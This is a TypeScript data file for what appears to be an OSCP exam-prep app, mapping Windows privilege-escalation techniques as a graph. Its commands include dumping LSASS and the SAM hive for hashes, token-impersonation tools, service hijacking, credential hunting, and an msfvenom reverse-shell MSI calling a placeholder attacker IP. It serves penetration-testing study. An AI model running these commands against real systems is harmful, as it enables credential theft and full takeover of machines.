import type { OscpContent } from '@/types/oscp'

/** Phase: Windows privilege escalation. */
const windowsPrivesc: OscpContent = {
    nodes: [
        {
            id: 'privesc-enum-windows',
            title: 'Enumerate for privesc (Windows)',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                '`whoami /priv` and `whoami /groups` decide almost everything. Then winPEAS for services, autoruns, saved creds and installed software.',
            commands: [
                {
                    label: 'Token privileges + groups',
                    code: `whoami /priv
whoami /groups
# service perms, autoruns, AlwaysInstallElevated:
winPEASx64.exe`,
                },
            ],
            tags: ['winpeas', 'whoami', 'priv', 'enumeration'],
        },
        {
            id: 'seimpersonate-potato',
            title: 'SeImpersonate -> Potato',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'SeImpersonatePrivilege (default for service accounts / IIS / MSSQL) lets you impersonate SYSTEM via a Potato. PrintSpoofer and GodPotato are the reliable OSCP picks.',
            commands: [
                {
                    label: 'PrintSpoofer / GodPotato',
                    code: `PrintSpoofer64.exe -i -c cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"`,
                },
            ],
            tags: ['seimpersonate', 'printspoofer', 'godpotato', 'potato'],
        },
        {
            id: 'sedebug-lsass',
            title: 'SeDebug -> dump LSASS',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'SeDebugPrivilege lets you read LSASS memory and pull cached NTLM hashes / plaintext. Feed them straight into pass-the-hash or cracking.',
            commands: [
                {
                    label: 'Dump + parse',
                    code: `# on target (or comsvcs.dll minidump):
rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump <lsass-pid> C:\\lsass.dmp full
# on Kali:
pypykatz lsa minidump lsass.dmp`,
                },
            ],
            tags: ['sedebug', 'lsass', 'pypykatz', 'mimikatz'],
        },
        {
            id: 'service-hijack',
            title: 'Service misconfiguration',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'Weak service binary permissions, an unquoted service path with a writable folder, or writable service registry keys all let you swap the binary and restart the service as SYSTEM.',
            commands: [
                {
                    label: 'Find + abuse',
                    code: `# writable service binary / unquoted path:
sc qc <service>
icacls "C:\\Path\\service.exe"
# replace binary, then:
sc stop <service> & sc start <service>`,
                },
            ],
            tags: ['service', 'unquoted-path', 'binary-hijack', 'registry'],
        },
        {
            id: 'alwaysinstallelevated',
            title: 'AlwaysInstallElevated',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'Both HKLM and HKCU AlwaysInstallElevated = 1 means any .msi runs as SYSTEM. Generate a malicious MSI and install it.',
            commands: [
                {
                    label: 'Check + exploit',
                    code: `reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=443 -f msi -o x.msi
msiexec /quiet /qn /i x.msi`,
                },
            ],
            tags: ['alwaysinstallelevated', 'msi', 'msiexec'],
        },
        {
            id: 'cred-hunt-windows',
            title: 'Credential hunting (Windows)',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'Unattend.xml, PowerShell history/transcripts, saved RDP/WiFi creds, cmdkey stores and the registry (Winlogon, PuTTY, VNC) leak passwords constantly.',
            commands: [
                {
                    label: 'Hunt',
                    code: `type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
findstr /si password *.xml *.ini *.txt *.config C:\\ 2>nul
cmdkey /list`,
                },
            ],
            tags: ['credentials', 'unattend', 'powershell-history', 'cmdkey'],
        },
        {
            id: 'kernel-exploit-windows',
            title: 'Kernel / missing patch',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'Feed systeminfo to a suggester when no misconfig exists. Older targets fall to known LPEs.',
            commands: [
                {
                    label: 'Suggest',
                    code: `systeminfo > sysinfo.txt
# on Kali:
windows-exploit-suggester.py --database db.xls --systeminfo sysinfo.txt`,
                },
            ],
            tags: ['kernel', 'systeminfo', 'suggester', 'patch'],
        },
        {
            id: 'system-windows',
            title: 'SYSTEM / local admin',
            type: 'state',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'Highest local privilege. Grab the flag, dump the SAM for local hashes, and - if the host is domain-joined - dump LSASS/mimikatz for domain creds to move laterally.',
            commands: [
                {
                    label: 'Dump local hashes',
                    code: `reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save
# on Kali:
impacket-secretsdump -sam sam.save -system system.save LOCAL`,
                },
            ],
            tags: ['system', 'administrator', 'sam', 'secretsdump'],
        },
    ],
    edges: [
        { from: 'privesc-enum-windows', to: 'seimpersonate-potato', label: 'SeImpersonate present' },
        { from: 'privesc-enum-windows', to: 'sedebug-lsass', label: 'SeDebug present' },
        { from: 'privesc-enum-windows', to: 'service-hijack', label: 'weak service / unquoted path' },
        { from: 'privesc-enum-windows', to: 'alwaysinstallelevated', label: 'AIE = 1' },
        { from: 'privesc-enum-windows', to: 'cred-hunt-windows', label: 'hunt saved creds' },
        { from: 'privesc-enum-windows', to: 'kernel-exploit-windows', label: 'no misconfig, old patch' },
        { from: 'seimpersonate-potato', to: 'system-windows', label: 'SYSTEM' },
        { from: 'sedebug-lsass', to: 'hash-to-crack', label: 'NTLM hashes' },
        { from: 'sedebug-lsass', to: 'creds-found', label: 'plaintext from LSASS' },
        { from: 'service-hijack', to: 'system-windows', label: 'service runs as SYSTEM' },
        { from: 'alwaysinstallelevated', to: 'system-windows', label: 'MSI as SYSTEM' },
        { from: 'cred-hunt-windows', to: 'creds-found', label: 'password recovered' },
        { from: 'kernel-exploit-windows', to: 'system-windows', label: 'LPE lands' },
        { from: 'system-windows', to: 'hash-to-crack', label: 'dump SAM' },
        { from: 'system-windows', to: 'ad-dump-creds', label: 'domain-joined -> dump domain creds' },
        { from: 'system-windows', to: 'ad-foothold', label: 'pivot into the domain' },
    ],
}

export default windowsPrivesc
